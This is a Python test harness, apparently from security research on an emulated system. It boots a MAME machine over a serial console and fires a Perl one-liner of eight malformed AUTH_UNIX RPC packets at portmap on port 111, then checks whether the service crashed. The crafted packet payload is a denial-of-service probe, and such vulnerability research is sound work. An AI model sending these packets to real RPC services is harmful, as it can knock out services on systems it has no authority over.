#!/usr/bin/env python3
"""
Fire-batch PORT template: the #2 portmap AUTH_UNIX fire, driven over the serial console (the clean
serial-I/O replacement for the natkeyboard mame_fire.cmd). Boots the persistent serial CHD, logs in,
records rpcinfo before, fires 8 malformed AUTH_UNIX calls at portmap (:111), then re-checks rpcinfo to
see whether portmap survived. Any other fire_*_nk.lua driver ports the same way: SerialConsole.run().
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from serial_console import SerialConsole

HERE = os.path.dirname(os.path.abspath(__file__))

# 8x malformed AUTH_UNIX RPC to portmap (port 111) -- the #2 payload from mame_fire.cmd, q{} to avoid quotes
FIRE = (r"""perl -e 'socket(S,2,2,0);for(1..8){send(S,"""
        r"""pack(q{N12},1,0,2,100000,2,0,1,8,0,4294967295,0,0),0,"""
        r"""pack(q{CCnC4x8},16,2,111,127,0,0,1))}'""")


def main():
    sc = SerialConsole(log_path=os.path.join(HERE, "fire_portmap.log"),
                       mame_log_path=os.path.join(HERE, "fire_portmap_mame.log"))
    try:
        sc.boot(seconds=560).login()
        print("[serial console up -> firing #2 portmap AUTH_UNIX over serial]\n")
        before, _ = sc.run("rpcinfo -p 127.0.0.1 2>&1 | wc -l")
        alive0, _ = sc.run("rpcinfo -p 127.0.0.1 >/dev/null 2>&1 && echo UP || echo DOWN")
        sc.run(FIRE + "; echo FIRED", timeout=30)
        after, _ = sc.run("rpcinfo -p 127.0.0.1 2>&1 | wc -l")
        alive1, _ = sc.run("rpcinfo -p 127.0.0.1 >/dev/null 2>&1 && echo UP || echo DOWN")
        sc.halt()
        print("=" * 60)
        print("portmap svc-lines  before=%s (%s)  after=%s (%s)" %
              (before.strip(), alive0.strip(), after.strip(), alive1.strip()))
        verdict = "SURVIVED (fire delivered, portmap still up)" if alive1.strip() == "UP" \
            else "portmap DOWN after fire (candidate finding!)"
        print("fire #2 over serial: DELIVERED ->", verdict)
        print("=> the natkeyboard fire batch ports to serial via SerialConsole.run(). Template done.")
        print("=" * 60)
        return 0
    except Exception as e:
        print("!! FAILED:", e)
        try: print("tail:", repr(sc.hs.text()[-400:]))
        except Exception: pass
        return 1
    finally:
        sc.close()


if __name__ == "__main__":
    sys.exit(main())
